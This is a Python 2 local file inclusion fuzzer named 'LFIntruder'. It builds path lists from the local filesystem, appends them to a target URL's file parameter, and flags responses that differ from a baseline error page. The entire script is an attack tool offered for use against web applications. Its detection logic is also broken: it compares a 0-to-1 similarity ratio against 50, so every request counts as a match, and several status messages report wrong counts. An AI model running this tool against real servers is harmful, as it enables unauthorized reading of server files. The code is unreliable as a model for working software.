from difflib import SequenceMatcher
import os, argparse, sys, random, requests

def Print(something):
    split = something.split("\n")
    if len(split) > 1:
        Print("")
        for each in split[1:]:
            print "    {}".format(each)
          
    else:
        print "[*] {}".format(something)

def generatePaths(Max = None):
    paths = []
    root = os.path.abspath(os.sep)
    for previous, dirs, files in os.walk(root):
        for dir in dirs: 
            if len(paths) == Max:
                return paths
            paths.append(os.path.join(previous, dir))
    return paths

def generateFiles(Max = None):
    paths = []
    root = os.path.abspath(os.sep)
    for previous, dirs, files in os.walk(root):
        for each in files: 
            if len(paths) == Max:
                return paths
            paths.append(os.path.join(previous, each))
    return paths

def combineWithFile(filename, pathList):
    newPaths = []
    for i in pathList:
        newPaths.append(os.path.join(i, filename))
    return newPaths

def savePaths(outfile, pathList):
    with open(outfile, "wa") as file:
        for i in paths:
            file.write(i+"\n")
        file.close()

def parse():
    parser = argparse.ArgumentParser()

    group = parser.add_mutually_exclusive_group()
    group.add_argument("--generate-dirs", default=False, action="store_true" , help="Generate directory paths. If not specified jump to LFI")
    group.add_argument("--generate-files", default=False, action="store_true" , help="Generate file paths. If not specified jump to LFI")
    group.add_argument("--generate-custom", default=False, action="store_true" , help="Generate paths with custom file. If not specified jump to LFI")

    parser.add_argument("-w", "--wordlist", default="", type=str, help="Wordlist to be used to test LFI")
    parser.add_argument("-o", "--out-file", default="", type=str, help="Write generated paths to file")
    parser.add_argument("-n", "--number", default=500, type=int, help="Number of maximum paths to be generated")
    parser.add_argument("-s", "--string", default="", type=str, help="Filename to be included in the paths")
    parser.add_argument("-u", "--url", default="", type=str, help="URL to be tested")

    args = parser.parse_args()
    return [parser, args]

def Banner():
    banner = """
##############################################################
 
     _     ______ _____      _                  _           
    | |    |  ___|_   _|    | |                | |          
    | |    | |_    | | _ __ | |_ _ __ _   _  __| | ___ _ __ 
    | |    |  _|   | || '_ \| __| '__| | | |/ _` |/ _ \ '__|
    | |____| |    _| || | | | |_| |  | |_| | (_| |  __/ |   
    \_____/\_|    \___/_| |_|\__|_|   \__,_|\__,_|\___|_|  


############################################### By Diego Bernal
                """
    print banner

def LFI_error_tester(url, tests, tolerance):
    # ASSUME THAT URL IS IN THE FORM OF: http://host:port/index.php?value=filepath
    
    error = []
    validity = 0

    for i in xrange(len(tests)):
        content = requests.get(url+tests[i]).content.strip()
        error.append(content)

    best = []

    for i in error:
        validity = 0
        for j in error:
            if SequenceMatcher(None, i, j).ratio() > tolerance:
                validity += SequenceMatcher(None, i, j).ratio()
        best.append((i, validity/len(tests)))

    max_score = max([n[1] for n in best])
    error = [i for i in best if i[1] == max_score][0][0]
    return error

def LFI_exploiter(url, error, paths):

    matches = 0

    try:
        for i in paths:
            content = requests.get(url+i).content.strip()
            if SequenceMatcher(None, content, error).ratio() < 50:
                Print("==> Match found with {}".format(url+i))
                matches += 1
    
    except KeyboardInterrupt:
        print "\r[*] Aborting, {} matches found.".format(matches)
        return 1

def urlparse(url, value):
    base = url.split("?")[0]
    params = url.split("?")[-1].split("&")
    for i in params:
        if i.split("=")[0] == value:
            params.append(params.pop(params.index(i)))
            
    return base + "?" + "=".join("&".join(params).split("=")[:-1])+"="

def getRubbish(attempts = 10):

    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    files = []
    ext = [".php", ".html", ".txt"]

    for i in xrange(attempts):
        files.append(''.join(random.choice(alphabet) for i in range(10)))

    return [x+y for x in files for y in ext]

if __name__ == "__main__":

    parser, args = parse()

    if len(sys.argv) == 1:
        Banner()
        parser.print_usage()
        print
        sys.exit(0)

    else:
        Banner()

    paths = []
    maxPaths = args.__dict__["number"]
    url = args.__dict__["url"]
    file_str = args.__dict__["string"]

    if args.__dict__["generate_dirs"] or args.__dict__["generate_files"] or args.__dict__["generate_custom"]:

        if args.__dict__["generate_dirs"]:
            
            Print("Generating directory paths from filesystem...")
            paths = generatePaths(maxPaths)
            Print("Number of directory paths generated: {}.".format(maxPaths))

        elif args.__dict__["generate_files"]:
            
            Print("Generating file paths from filesystem...")
            paths = generateFiles(maxPaths)
            Print("Number of file paths generated: {}.".format(maxPaths))

        else:
            if file_str == "":
                Print("--generate_custom flag needs a filename to craft the paths. Include it with -s STRING or --string STRING\n")
                sys.exit(1)

            Print("Generating custom file paths from filesystem with: {}...".format(file_str))
            paths = generatePaths(maxPaths)
            paths = combineWithFile(file_str, paths)
            Print("Number of file paths generated: {}.".format(maxPaths))

    else:

        Print("Generating file paths from filesystem...")

        paths = generateFiles(maxPaths)

        Print("Number of file paths generated: {}.".format(maxPaths))
        
    if url:

        Print("Getting error message from: {}.".format(url))

        tests = getRubbish()
        tolerance = 0.75
        value = "file" # rewrite so that it's in arguments

        url = urlparse(url, value) # rearranges url so that fuzzed parameter is last & empty

        error = LFI_error_tester(url, tests, tolerance)

        Print("Error message detected, lenght = {}.".format(len(error)))
        #Print(error)
        Print("Starting exploitation...")
        LFI_exploiter(url, error, paths)

    if args.__dict__["out_file"] != "": 

        out = args.__dict__["out_file"]

        Print("Saving generated paths to {}...".format(out))
        savePaths(out, paths)

